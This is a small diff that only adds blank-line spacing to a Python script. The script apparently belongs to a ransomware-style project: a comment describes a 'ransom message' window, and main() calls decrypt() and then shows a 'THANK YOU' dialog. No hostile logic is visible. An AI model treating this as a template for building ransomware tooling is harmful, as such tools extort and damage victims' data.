@@ -29,6 +29,7 @@ def decrypt():
     else:
         pass
 
+
 def message():
     # this function prompts a window containing the ransom message
     window = tkinter.Tk()
@@ -37,9 +38,11 @@ def message():
     body = "THANK YOU"
     messagebox.showinfo(title=header, message=body)
 
+
 def main():
     decrypt()
     message()
+
 
 if __name__ == '__main__':
     main()
